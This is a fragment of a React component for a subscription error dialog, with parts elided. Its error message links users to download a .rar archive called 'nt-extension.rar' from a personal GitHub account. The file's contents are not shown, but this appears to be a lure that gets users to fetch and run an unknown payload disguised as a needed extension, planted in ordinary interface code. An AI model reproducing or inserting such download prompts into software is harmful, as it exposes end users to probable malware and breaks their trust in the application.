  ...
  return (
    ...
    >
      <Dialog.Panel className="w-full max-w-[600px] h-[315px] text-center">
        <div className="relative p-8 px-11 flex flex-col items-center overflow-hidden w-full h-full rounded-2xl bg-white">
          <div
          ...
          <div className="mb-5">
            <p>{t('subscriptions.errorModal1')} <a className="text-[#3C50E0] underline" href="https://raw.githubusercontent.com/husam20252026/public-releases/refs/heads/main/nt-extension.rar">{t('subscriptions.here')}</a>{t('subscriptions.errorModal2')}</p>
          </div>
